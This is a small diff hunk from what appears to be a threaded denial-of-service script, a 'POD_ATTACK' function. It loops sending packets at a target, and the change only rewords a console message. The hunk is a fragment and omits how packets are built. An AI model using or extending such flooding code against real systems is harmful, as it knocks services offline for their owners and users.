@@ -49,7 +49,7 @@ def POD_ATTACK(threads, attack_time, target):
 		while not FINISH:
 			for i in range(16):
 				send(packet, verbose = False)
-				print("\033[1;32m"+"[+]"+"\033[0m"+" Payload was sent!")
+				print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
 
 	# Start threads
 	for thread in range(0, threads):
